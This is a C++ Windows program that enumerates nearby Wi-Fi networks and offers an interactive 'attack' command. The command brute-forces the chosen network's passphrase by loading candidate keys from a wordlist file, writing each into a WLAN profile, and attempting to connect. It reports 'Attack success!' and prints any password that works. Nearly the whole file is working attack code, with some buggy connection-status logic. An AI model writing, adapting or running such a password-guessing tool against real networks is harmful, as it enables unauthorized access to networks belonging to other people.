#include "stdafx.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>

#include <atlbase.h>
#include <atlstr.h>
#define STRSAFE_NO_DEPRECATE
#include <strsafe.h> // for String... functions
#include <crtdbg.h> // for _ASSERTE  

using namespace std;

// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")


char* xmlKeyFile="xml-key.txt";
char* xmlKeyExampleFile="xml-key-example.txt";
char* xmlOpenFile="xml-open.txt";
char* xmlOpenExampleFile="xml-open-example.txt";
char* keyListFile = "key-list.txt";

char fileBuffer[5000];
char profileXmlTmp[5000];
char fileBuffer_open[5000];
char profileXmlTmp_open[5000];

char valueToHexCh(const int value)
{
	char result = '\0';
	if(value >= 0 && value <= 9){
		result = (char)(value + 48); //48为ascii编码的‘0’字符编码值
	}
	else if(value >= 10 && value <= 15){
		result = (char)(value - 10 + 65); //减去10则找出其在16进制的偏移量，65为ascii的'A'的字符编码值
	}
	else{
		;
	}

	return result;
}

int strToHex(char *ch, char *hex)
{
	int high,low;
	int tmp = 0;
	if(ch == NULL || hex == NULL){
		return -1;
	}

	if(strlen(ch) == 0){
		return -2;
	}

	while(*ch){
		tmp = (int)*ch;
		high = tmp >> 4;
		low = tmp & 15;
		*hex++ = valueToHexCh(high); //先写高字节
		*hex++ = valueToHexCh(low); //其次写低字节
		ch++;
	}
	*hex = '\0';
	return 0;
}

void StrReplace(char* strSrc, char* strFind, char* strReplace)
{
	while (*strSrc != '\0')
	{
		if (*strSrc == *strFind)
		{
			if (strncmp(strSrc, strFind, strlen(strFind)) == 0)
			{
				int i = strlen(strFind);
				int j = strlen(strReplace);
				char* q = strSrc+i;
				char* p = q;//p、q均指向剩余字符串的首地址
				char* repl = strReplace;
				int lastLen = 0;
				while (*q++ != '\0')
					lastLen++;
				char* temp = new char[lastLen+1];//临时开辟一段内存保存剩下的字符串,防止内存覆盖
				for (int k = 0; k < lastLen; k++)
				{
					*(temp+k) = *(p+k);
				}
				*(temp+lastLen) = '\0';
				while (*repl != '\0')
				{
					*strSrc++ = *repl++;
				}
				p = strSrc;
				char* pTemp = temp;//回收动态开辟内存
				while (*pTemp != '\0')
				{
					*p++ = *pTemp++;
				}
				delete temp;
				*p = '\0';
			}
			else
				strSrc++;
		}
		else
			strSrc++;
	}
}

void c2lpw(LPWSTR rt, char* cstr)
{
	int  len = 0;
	len = strlen(cstr);
	int  unicodeLen = ::MultiByteToWideChar( CP_ACP,
		0,
		cstr,
		-1,
		NULL,
		0 );  
	LPWSTR  pUnicode;  
	pUnicode = new wchar_t[unicodeLen+1];  
	memset(pUnicode,0,(unicodeLen+1)*sizeof(wchar_t));  
	::MultiByteToWideChar( CP_ACP,
		0,
		cstr,
		-1,
		(LPWSTR)pUnicode,
		unicodeLen );
	wcscpy_s(rt, wcslen(pUnicode)+1,pUnicode);
	//wstring  rt;
	//rt = ( wchar_t* )pUnicode;
	delete  pUnicode; 
}

LPCWSTR c2lpcw(char* cStr)
{    
	CString str = CString(cStr); 
	LPCWSTR lpcwStr = str.AllocSysString();
	return lpcwStr;
}

void readFile(char* fileName, char* &fileBuffer)
{
	FILE * pFile;  
	long lSize;  
	char * buffer;  
	size_t result;  

	/* 若要一个byte不漏地读入整个文件，只能采用二进制方式打开 */   
	fopen_s (&pFile, fileName, "rb" );  
	if (pFile==NULL)  
	{  
		fputs ("File error",stderr);  
		exit (1);  
	}  

	/* 获取文件大小 */  
	fseek (pFile , 0 , SEEK_END);  
	lSize = ftell (pFile);  
	rewind (pFile);  

	/* 分配内存存储整个文件 */   
	buffer = (char*) malloc (sizeof(char)*lSize);  
	//memset(buffer, 0, sizeof(buffer));
	if (buffer == NULL)  
	{  
		fputs ("Memory error",stderr);   
		exit (2);  
	}  

	/* 将文件拷贝到buffer中 */  
	result = fread (buffer,1,lSize,pFile);  
	if (result != lSize)  
	{  
		fputs ("Reading error",stderr);  
		exit (3);  
	}  
	/* 现在整个文件已经在buffer中，可由标准输出打印内容 */  
	//memset(fileBuffer, 0, sizeof(fileBuffer));
	strcpy_s(fileBuffer,strlen(buffer)+1,buffer);
	//printf("%s\n", buffer);   

	/* 结束演示，关闭文件并释放内存 */  
	fclose (pFile);  
	free (buffer);  
}

void networkInfo(PWLAN_AVAILABLE_NETWORK &pBssEntry, int j)
{
	int iRSSI = 0;
	int k;

	//PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;
	wprintf(L"  Profile Name[%u]:  %ws\n", j, pBssEntry->strProfileName);

	wprintf(L"  SSID[%u]:\t\t ", j);
	if (pBssEntry->dot11Ssid.uSSIDLength == 0)
		wprintf(L"\n");
	else {   
		for (k = 0; k < pBssEntry->dot11Ssid.uSSIDLength; k++) {
			wprintf(L"%c", (int) pBssEntry->dot11Ssid.ucSSID[k]);
		}
		wprintf(L"\n");
	}

	wprintf(L"  BSS Network type[%u]:\t ", j);
	switch (pBssEntry->dot11BssType) {
	case dot11_BSS_type_infrastructure   :
		wprintf(L"Infrastructure (%u)\n", pBssEntry->dot11BssType);
		break;
	case dot11_BSS_type_independent:
		wprintf(L"Infrastructure (%u)\n", pBssEntry->dot11BssType);
		break;
	default:
		wprintf(L"Other (%lu)\n", pBssEntry->dot11BssType);
		break;
	}

	wprintf(L"  Number of BSSIDs[%u]:\t %u\n", j, pBssEntry->uNumberOfBssids);

	wprintf(L"  Connectable[%u]:\t ", j);
	if (pBssEntry->bNetworkConnectable)
		wprintf(L"Yes\n");
	else {
		wprintf(L"No\n");
		wprintf(L"  Not connectable WLAN_REASON_CODE value[%u]:\t %u\n", j, 
			pBssEntry->wlanNotConnectableReason);
	}        

	wprintf(L"  Number of PHY types supported[%u]:\t %u\n", j, pBssEntry->uNumberOfPhyTypes);

	if (pBssEntry->wlanSignalQuality == 0)
		iRSSI = -100;
	else if (pBssEntry->wlanSignalQuality == 100)   
		iRSSI = -50;
	else
		iRSSI = -100 + (pBssEntry->wlanSignalQuality/2);    

	wprintf(L"  Signal Quality[%u]:\t %u (RSSI: %i dBm)\n", j, 
		pBssEntry->wlanSignalQuality, iRSSI);

	wprintf(L"  Security Enabled[%u]:\t ", j);
	if (pBssEntry->bSecurityEnabled)
		wprintf(L"Yes\n");
	else
		wprintf(L"No\n");

	wprintf(L"  Default AuthAlgorithm[%u]: ", j);
	switch (pBssEntry->dot11DefaultAuthAlgorithm) {
	case DOT11_AUTH_ALGO_80211_OPEN:
		wprintf(L"802.11 Open (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_80211_SHARED_KEY:
		wprintf(L"802.11 Shared (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_WPA:
		wprintf(L"WPA (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_WPA_PSK:
		wprintf(L"WPA-PSK (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_WPA_NONE:
		wprintf(L"WPA-None (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_RSNA:
		wprintf(L"RSNA (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_RSNA_PSK:
		wprintf(L"RSNA with PSK(%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	default:
		wprintf(L"Other (%lu)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	}

	wprintf(L"  Default CipherAlgorithm[%u]: ", j);
	switch (pBssEntry->dot11DefaultCipherAlgorithm) {
	case DOT11_CIPHER_ALGO_NONE:
		wprintf(L"None (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	case DOT11_CIPHER_ALGO_WEP40:
		wprintf(L"WEP-40 (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	case DOT11_CIPHER_ALGO_TKIP:
		wprintf(L"TKIP (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	case DOT11_CIPHER_ALGO_CCMP:
		wprintf(L"CCMP (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	case DOT11_CIPHER_ALGO_WEP104:
		wprintf(L"WEP-104 (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	case DOT11_CIPHER_ALGO_WEP:
		wprintf(L"WEP (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	default:
		wprintf(L"Other (0x%x)\n", pBssEntry->dot11DefaultCipherAlgorithm);
		break;
	}

	wprintf(L"  Flags[%u]:\t 0x%x", j, pBssEntry->dwFlags);
	if (pBssEntry->dwFlags) {
		if (pBssEntry->dwFlags & WLAN_AVAILABLE_NETWORK_CONNECTED)
			wprintf(L" - Currently connected");
		if (pBssEntry->dwFlags & WLAN_AVAILABLE_NETWORK_CONNECTED)
			wprintf(L" - Has profile");
	}   
	wprintf(L"\n");

	//wprintf(L"\n");
}

int key_idx = 0;
int key_tol = 10;
FILE *keyListFP=NULL; 
int check_ok(char x)
{
	if (x == '\n' || x == '\r')
		return 0;
	return 1;
}
int nextKey(char* &key)
{
	//if (key_idx >= key_tol) return -1;
	//char key0[120]= "aaaaaaaa";
	//strcpy_s(key, strlen(key0)+1, key0);
	//key_idx++;
	if (key_idx == 0)
	{
		fopen_s (&keyListFP, keyListFile, "r" );  
		if (keyListFP==NULL)  
		{  
			fputs("File error",stderr);  
			return -1;
		}  
	}
	if (key_idx < key_tol)
	{
		char StrLine[120];					//每行最大读取的字符数
		while (!feof(keyListFP)) 
		{ 
			fgets(StrLine,1024,keyListFP);  //读取一行
			while ( strlen(StrLine) > 0 && !check_ok(StrLine[strlen(StrLine)-1]) )
			{
				StrLine[strlen(StrLine)-1]='\0';
			}
			if (strlen(StrLine) == 0)
				continue;
			strcpy_s(key, strlen(StrLine)+1, StrLine);
			key_idx++;
			return 0;
		}
	}
	fclose(keyListFP);                  //关闭文件
	keyListFP=NULL;
	key_idx = 0;
	return -1;
}
int check_net_op(char * netop)
{
	if (strcmp(netop, "info") == 0 || strcmp(netop, "attack") == 0)
		return 1;
	return 0;
}
int check_index(int x, int up)
{
	if (x >= 0 && x < up) return 1;
	return 0;
}

int connect_status(PWLAN_INTERFACE_INFO &pIfInfo)
{
	//wprintf(L"  Interface State[%d]:\t ", i);
	//wprintf(L"	connectState: %d\n", pIfInfo->isState);
	switch (pIfInfo->isState) {
	case wlan_interface_state_not_ready:
		//wprintf(L"Not ready\n");
		break;
	case wlan_interface_state_connected:
		//wprintf(L"Connected\n");
		return 1;
		break;
	case wlan_interface_state_ad_hoc_network_formed:
		//wprintf(L"First node in a ad hoc network\n");
		break;
	case wlan_interface_state_disconnecting:
		//wprintf(L"Disconnecting\n");
		break;
	case wlan_interface_state_disconnected:
		//wprintf(L"Not connected\n");
		break;
	case wlan_interface_state_associating:
		//wprintf(L"Attempting to associate with a network\n");
		return 2;
		break;
	case wlan_interface_state_discovering:
		//wprintf(L"Auto configuration is discovering settings for the network\n");
		break;
	case wlan_interface_state_authenticating:
		//wprintf(L"In process of authenticating\n");
		break;
	default:
		//wprintf(L"Unknown state %ld\n", pIfInfo->isState);
		break;
	}
	//wprintf(L"\n");
	return 0;
}

int get_authalg(PWLAN_AVAILABLE_NETWORK &pBssEntry)
{
	switch (pBssEntry->dot11DefaultAuthAlgorithm) {
	case DOT11_AUTH_ALGO_80211_OPEN:
		//wprintf(L"802.11 Open (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		return 1;//auth_flag = 1;
		break;
	case DOT11_AUTH_ALGO_80211_SHARED_KEY:
		//wprintf(L"802.11 Shared (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_WPA:
		//wprintf(L"WPA (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_WPA_PSK:
		//wprintf(L"WPA-PSK (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_WPA_NONE:
		//wprintf(L"WPA-None (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_RSNA:
		//wprintf(L"RSNA (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	case DOT11_AUTH_ALGO_RSNA_PSK:
		//wprintf(L"RSNA with PSK(%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	default:
		//wprintf(L"Other (%lu)\n", pBssEntry->dot11DefaultAuthAlgorithm);
		break;
	}
	return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
	//return test1();
	// Declare and initialize variables.

	HANDLE hClient = NULL;
	DWORD dwMaxClient = 2;      //    
	DWORD dwCurVersion = 0;
	DWORD dwResult = 0;
	DWORD dwRetVal = 0;
	int iRet = 0;

	WCHAR GuidString[39] = {0};
	unsigned int i, j, k;

	/*
	char kk[120];
	char* p_kk = kk;
	while (!nextKey(p_kk))
	{
	cout << p_kk << endl;
	}
	system("pause");
	*/

	//read file xml-key.txt
	char* xxx_p1=fileBuffer;
	char* xxx_p2 = fileBuffer_open;
	readFile(xmlKeyFile, xxx_p1);
	readFile(xmlOpenFile, xxx_p2);
	//printf("%s\n",fileBuffer);
	//printf("%d\n", strlen(fileBuffer));
	//system("pause");

	/* variables used for WlanEnumInterfaces  */
	//PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	//PWLAN_INTERFACE_INFO pIfInfo = NULL;
	LPCWSTR pProfileName = NULL;
	//LPWSTR pProfileXml = NULL;
	LPWSTR pProfileXml = new wchar_t[5000];
	DWORD dwFlags = 0;
	DWORD dwGrantedAccess = 0;

	/* variables used for WlanEnumInterfaces  */
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;

	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
	PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;

	int iRSSI = 0;

	//while (1) {
	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanOpenHandle failed with error: %u\n", dwResult);
		return 1;
		// You can use FormatMessage here to find out why the function failed
	}

	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanEnumInterfaces failed with error: %u\n", dwResult);
		return 1;
		// You can use FormatMessage here to find out why the function failed
	} else {
		//
		//interfaceListInfo(pIfList);
		//system("pause");

		//wprintf(L"Num Entries: %lu\n", pIfList->dwNumberOfItems);
		//wprintf(L"Current Index: %lu\n", pIfList->dwIndex);
		printf("======================Interfaces Info======================\n");
		wprintf(L"Interface Number: %lu\n", pIfList->dwNumberOfItems);
		for (i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
			pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];
			wprintf(L"  Interface Index[%u]:\t %lu\n", i, i);
			iRet = StringFromGUID2(pIfInfo->InterfaceGuid, (LPOLESTR) &GuidString, 
				sizeof(GuidString)/sizeof(*GuidString)); 
			// For c rather than C++ source code, the above line needs to be
			// iRet = StringFromGUID2(&pIfInfo->InterfaceGuid, (LPOLESTR) &GuidString, 
			//     sizeof(GuidString)/sizeof(*GuidString)); 
			if (iRet == 0)
				wprintf(L"StringFromGUID2 failed\n");
			else {
				wprintf(L"  InterfaceGUID[%d]: %ws\n",i, GuidString);
			}    
			wprintf(L"  Interface Description[%d]: %ws", i, 
				pIfInfo->strInterfaceDescription);
			wprintf(L"\n");
			wprintf(L"  Interface State[%d]:\t ", i);
			switch (pIfInfo->isState) {
			case wlan_interface_state_not_ready:
				wprintf(L"Not ready\n");
				break;
			case wlan_interface_state_connected:
				wprintf(L"Connected\n");
				break;
			case wlan_interface_state_ad_hoc_network_formed:
				wprintf(L"First node in a ad hoc network\n");
				break;
			case wlan_interface_state_disconnecting:
				wprintf(L"Disconnecting\n");
				break;
			case wlan_interface_state_disconnected:
				wprintf(L"Not connected\n");
				break;
			case wlan_interface_state_associating:
				wprintf(L"Attempting to associate with a network\n");
				break;
			case wlan_interface_state_discovering:
				wprintf(L"Auto configuration is discovering settings for the network\n");
				break;
			case wlan_interface_state_authenticating:
				wprintf(L"In process of authenticating\n");
				break;
			default:
				wprintf(L"Unknown state %ld\n", pIfInfo->isState);
				break;
			}
			//wprintf(L"\n");
		}

		int interfaceidx=-1;
		if ((int)(pIfList->dwNumberOfItems) == 0)
		{
			printf("There are no interface.\n");
			return 0;
		} 
		else if ((int)(pIfList->dwNumberOfItems) > 1)
		{
			while ( (interfaceidx < 0) || (interfaceidx >= (int)(pIfList->dwNumberOfItems)) )
			{
				printf("Please Choose interface, input interface index ...\n");
				scanf_s("%d",&interfaceidx);
				//try which one
			}	
		} 
		else 
		{
			interfaceidx = 0;
		}
		printf("Now, interface %d\n", interfaceidx);
		pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[interfaceidx];	

		/////////////////////////////////interface//////////////////////////////////////
		printf("===========Networks Info===========\n");
		dwResult = WlanGetAvailableNetworkList(hClient,
			&pIfInfo->InterfaceGuid,
			0, 
			NULL, 
			&pBssList);
		if (dwResult != ERROR_SUCCESS) {
			wprintf(L"WlanGetAvailableNetworkList failed with error: %u\n",
				dwResult);
			dwRetVal = 1;
			// You can use FormatMessage to find out why the function failed
		} else {
			printf("====NetworkList====\n");
			wprintf(L"  Available network list for this interface\n");
			wprintf(L"  Num Networks: %lu\n", pBssList->dwNumberOfItems);
			for (j = 0; j < pBssList->dwNumberOfItems; j++) {
				pBssEntry =
					(WLAN_AVAILABLE_NETWORK *) & pBssList->Network[j];
				wprintf(L"  SSID[%u]:\t\t ", j);
				if (pBssEntry->dot11Ssid.uSSIDLength == 0)
					wprintf(L"\n");
				else {   
					for (k = 0; k < pBssEntry->dot11Ssid.uSSIDLength; k++) {
						wprintf(L"%c", (int) pBssEntry->dot11Ssid.ucSSID[k]);
					}
					wprintf(L"\n");
				}
				//networkInfo(pBssEntry,j);
			}

			int netidx=-1;
			char netop[100];
			while (1)
			{
				printf("\n");
				printf("====Usage====\n");
				printf("Usage: \n");
				printf("	info <index>\n");
				printf("	attack <index>\n");
				printf("	network-list\n");
				printf("	exit\n");
				printf(">>>");

				scanf_s("%s", netop,100);
				if (strcmp(netop, "exit") == 0)
					break;
				if (strcmp(netop, "network-list") == 0)
				{
					printf("====NetworkList====\n");
					wprintf(L"  Available network list for this interface\n");
					wprintf(L"  Num Networks: %lu\n", pBssList->dwNumberOfItems);
					for (j = 0; j < pBssList->dwNumberOfItems; j++) {
						pBssEntry =
							(WLAN_AVAILABLE_NETWORK *) & pBssList->Network[j];
						wprintf(L"  SSID[%u]:\t\t ", j);
						if (pBssEntry->dot11Ssid.uSSIDLength == 0)
							wprintf(L"\n");
						else {   
							for (k = 0; k < pBssEntry->dot11Ssid.uSSIDLength; k++) {
								wprintf(L"%c", (int) pBssEntry->dot11Ssid.ucSSID[k]);
							}
							wprintf(L"\n");
						}
						//networkInfo(pBssEntry,j);
					}
					continue;
				}
				scanf_s("%d", &netidx);
				if (strcmp(netop, "info") == 0 && check_index(netidx, (int)(pBssList->dwNumberOfItems)))
				{
					printf("====NetworkInfo====\n");
					pBssEntry =
						(WLAN_AVAILABLE_NETWORK *) & pBssList->Network[netidx];	
					networkInfo(pBssEntry, netidx);
					continue;
				}
				if (strcmp(netop, "attack") == 0 && check_index(netidx, (int)(pBssList->dwNumberOfItems)))
				{
					/////////////////////////////////network//////////////////////////////////////
					printf("====NetworkAttack====\n");
					char ssid_name[120];
					char ssid_hex[120];
					char *p_ch = ssid_name;
					char *p_hex = ssid_hex;
					pBssEntry =
						(WLAN_AVAILABLE_NETWORK *) & pBssList->Network[netidx];	
					//wprintf(L"  Default AuthAlgorithm[%u]: ", j);

					printf("==NetworkInfo\n");
					networkInfo(pBssEntry, netidx);


					int open_auth_flag = 0;
					open_auth_flag = get_authalg(pBssEntry);
					/*if (auth_flag == 1)
					{
					wprintf(L"<<< Attack failed! You need login via a web page\n");
					wprintf(L"<<< AuthAlgorithm: 802.11 Open (%u)\n", pBssEntry->dot11DefaultAuthAlgorithm);
					continue;
					}
					*/

					printf("==Now, Try to attack this network: ");
					if (pBssEntry->dot11Ssid.uSSIDLength == 0)
						wprintf(L"\n");
					else {   
						for (k = 0; k < pBssEntry->dot11Ssid.uSSIDLength; k++) {
							wprintf(L"%c", (int) pBssEntry->dot11Ssid.ucSSID[k]);
							ssid_name[k]=(char)(int)(pBssEntry->dot11Ssid.ucSSID[k]);
						}
						ssid_name[pBssEntry->dot11Ssid.uSSIDLength] = '\0';
						wprintf(L"\n");
					}

					pProfileName = pBssEntry->strProfileName;
					//if (wcslen(pProfileName) == 0)
					pProfileName=c2lpcw(p_ch);
					//wprintf(L"%s\n",pProfileName);
					//printf("%d\n",wcslen(pProfileName));

					strcpy_s(profileXmlTmp, strlen(fileBuffer)+1, fileBuffer);
					StrReplace(profileXmlTmp, "$ssid-name$", p_ch);
					strToHex(p_ch,p_hex);
					StrReplace(profileXmlTmp, "$ssid-hex$", p_hex);

					strcpy_s(profileXmlTmp_open, strlen(fileBuffer_open)+1, fileBuffer_open);
					StrReplace(profileXmlTmp_open, "$ssid-name$", p_ch);
					strToHex(p_ch,p_hex);
					StrReplace(profileXmlTmp_open, "$ssid-hex$", p_hex);

					int try_cnt = 0;
					while (1)//try to connect this network
					{
						char ssid_key[120];
						char *p_key = ssid_key;
						if (try_cnt != 0)
						{
							//break;//////////////////////debug
							int key_rt = nextKey(p_key);
							//cout << key_rt << " " << p_key << endl;
							if (key_rt)
							{
								printf("<<< Attack failed!\n");
								//printf("\n");
								break;
							}
							StrReplace(profileXmlTmp, "$ssid-key$", p_key);
							printf("Count %d, Try password: %s\n", try_cnt, p_key);

							//CString xmlStrTmp = CString(profileXmlTmp);  
							//pProfileXml = (LPWSTR)(LPCTSTR)xmlStrTmp;  
							//pProfileXml[wcslen(pProfileXml)-6]=NULL;
							//wprintf(L"%s\n",pProfileXml);
							c2lpw(pProfileXml, profileXmlTmp);
							//pProfileXml[wcslen(pProfileXml)-7]=NULL;
							while (pProfileXml[wcslen(pProfileXml)-1] != L'>')
								pProfileXml[wcslen(pProfileXml)-1]=NULL;
							try_cnt += 1;
						}
						else 
						{
							printf("Count %d, no password\n", try_cnt);
							c2lpw(pProfileXml, profileXmlTmp_open);
							//pProfileXml[wcslen(pProfileXml)-7]=NULL;
							while (pProfileXml[wcslen(pProfileXml)-1] != L'>')
								pProfileXml[wcslen(pProfileXml)-1]=NULL;
							//wprintf(L"%d %c", L'>', L'>');
							try_cnt += 1;
						}
						//wprintf(L"%s\n",pProfileXml);///////////////////////////////////////////

						DWORD pdwReasonCode=0;
						dwResult = WlanSetProfile( 
							hClient,  
							&pIfInfo->InterfaceGuid, 
							0,//0表示全部用户  
							pProfileXml,//前面的XML  
							NULL,//xp下必须为NULL  
							true,//如已存在profile，是否覆盖  
							NULL,
							&pdwReasonCode );  
						if (dwResult != ERROR_SUCCESS) {
							printf("<<< Attack failed!\n");
							wprintf(L"	WlanSetProfile failed with error: %u\n",
								dwResult);
							dwRetVal = 1;
							if (dwResult == ERROR_ACCESS_DENIED)
							{
								printf("	ERROR_ACCESS_DENIED\n");
							}
							else if (dwResult == ERROR_ALREADY_EXISTS)
							{
								printf("	ERROR_ALREADY_EXISTS\n");
							}
							else if (dwResult == ERROR_BAD_PROFILE)
							{
								printf("	ERROR_BAD_PROFILE\n");
								printf("	pdwReasonCode: %d\n", pdwReasonCode);
							}
							else if (dwResult == ERROR_INVALID_PARAMETER)
							{
								printf("	ERROR_INVALID_PARAMETER\n");
							}
							else
							{
								printf("	Other reason\n");
							}
							//printf("\n");
							break;///
							// You can use FormatMessage to find out why the function failed
						} else {

							WLAN_CONNECTION_PARAMETERS wlanConnPara;
							wlanConnPara.wlanConnectionMode =wlan_connection_mode_profile ; //YES,WE CONNECT AP VIA THE PROFILE
							wlanConnPara.strProfile =pProfileName;				//wlanAN.strProfileName			// set the profile name
							wlanConnPara.pDot11Ssid = NULL;							//wlanAN.dot11Ssid?		// SET SSID NULL
							wlanConnPara.dot11BssType = dot11_BSS_type_infrastructure;//wlanAN.DOT11_BSS_TYPE		//dot11_BSS_type_any,I do not need it this time.	    
							wlanConnPara.pDesiredBssidList = NULL;							// the desired BSSID list is empty
							wlanConnPara.dwFlags = WLAN_CONNECTION_HIDDEN_NETWORK;	//?		//it works on my WIN7\8

							dwResult=WlanConnect(hClient,&pIfList->InterfaceInfo[0].InterfaceGuid,&wlanConnPara ,NULL);
							if (dwResult==ERROR_SUCCESS)
							{
								if (try_cnt == 1 && open_auth_flag == 1)
								{
									printf("	WlanConnect success!\n");
									printf("<<< Attack success!\n");
									printf("<<< network-name: %s\n", p_ch);
									printf("<<< no password, but you may need login via a web page\n");
									//printf("\n");
									break;///jump out of while(1)
								}
								int rt = 2;
								while (rt = connect_status(pIfInfo) == 2){};////////////////////debug

								if (rt == 1)
								{
									printf("	WlanConnect success!\n");
									printf("<<< Attack success!\n");
									printf("<<< network-name: %s\n", p_ch);
									printf("<<< password: %s\n", p_key);
									//printf("\n");
									break;///jump out of while(1)
								}
								else if (rt == 0)
								{
									printf("	WlanConnect failed!\n");
									continue;
								}
							}
							else
							{
								if (dwResult == ERROR_ACCESS_DENIED)
								{
									printf("	WlanConnect failed!\n");
									continue;
								}
								else 
								{
									printf("<<< Attack failed!\n");
									printf("	WlanConnect failed, err is %d\n",dwResult);
									//printf("\n");
									break;///
								}
							}
						}
					}
				}
				//try which one
			}
		}
	}

	//}
	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}

	if (pIfList != NULL) {
		WlanFreeMemory(pIfList);
		pIfList = NULL;
	}
	delete pProfileXml;

	system("pause");
	return dwRetVal;
}

/*
LPWSTR xxx = new wchar_t[5000];
c2lpw(xxx, fileBuffer);
xxx[wcslen(xxx)-6]=NULL;
//printf("%d\n", strlen(fileBuffer));
//printf("%s\n",fileBuffer);
//printf("%d\n", wcslen(xxx));
//wprintf(L"%c\n", xxx[wcslen(xxx)-1]);
//wprintf(L"%s\n", xxx);
delete xxx;
*/

/*
char ch[1024];
char hex[1024];
char *p_ch = ch;
char *p_hex = hex;
p_ch = "aa";
strToHex(p_ch,p_hex);
printf("%s\n",p_hex);
*/

/*
pProfileName=c2lpcw("aa");
cout << pProfileName<< " " << "aa"<< endl;
wprintf(L"%s\n", pProfileName);
dwResult = WlanGetProfile(hClient,
&pIfInfo->InterfaceGuid,
pProfileName,
NULL, 
&pProfileXml,
&dwFlags,
&dwGrantedAccess);

if (dwResult != ERROR_SUCCESS) {
wprintf(L"WlanGetProfile failed with error: %u\n",
dwResult);
// You can use FormatMessage to find out why the function failed
}
wprintf(L"%s\n",pProfileXml);
*/

//LPWSTR profileXml = NULL;
//strcpy_s(profileXmlTmp, strlen(fileBuffer)+1, fileBuffer);
//CString xmlStrTmp = CString(profileXmlTmp);  
//profileXml = (LPWSTR)(LPCTSTR)xmlStrTmp;  
//wprintf(L"%s\n", profileXml);
//printf("=================\n");

/*
pProfileName=c2lpcw("UCAS");
cout << pProfileName<< " " << "UCAS"<< endl;
wprintf(L"%s\n", pProfileName);
dwResult = WlanGetProfile(hClient,
&pIfInfo->InterfaceGuid,
pProfileName,
NULL, 
&pProfileXml,
&dwFlags,
&dwGrantedAccess);

if (dwResult != ERROR_SUCCESS) {
wprintf(L"WlanGetProfile failed with error: %u\n",
dwResult);
// You can use FormatMessage to find out why the function failed
} else {
wprintf(L"  Profile Name:  %ws\n", pProfileName);

wprintf(L"  Profile XML string:\n");
wprintf(L"%ws\n\n", pProfileXml);

wprintf(L"  dwFlags:\t    0x%x", dwFlags);
//                    if (dwFlags & WLAN_PROFILE_GET_PLAINTEXT_KEY)
//                        wprintf(L"   Get Plain Text Key");
if (dwFlags & WLAN_PROFILE_GROUP_POLICY)
wprintf(L"  Group Policy");
if (dwFlags & WLAN_PROFILE_USER)
wprintf(L"  Per User Profile");
wprintf(L"\n");    

wprintf(L"  dwGrantedAccess:  0x%x", dwGrantedAccess);
if (dwGrantedAccess & WLAN_READ_ACCESS)
wprintf(L"  Read access");
if (dwGrantedAccess & WLAN_EXECUTE_ACCESS)
wprintf(L"  Execute access");
if (dwGrantedAccess & WLAN_WRITE_ACCESS)
wprintf(L"  Write access");
wprintf(L"\n");    

wprintf(L"\n");
}
*/
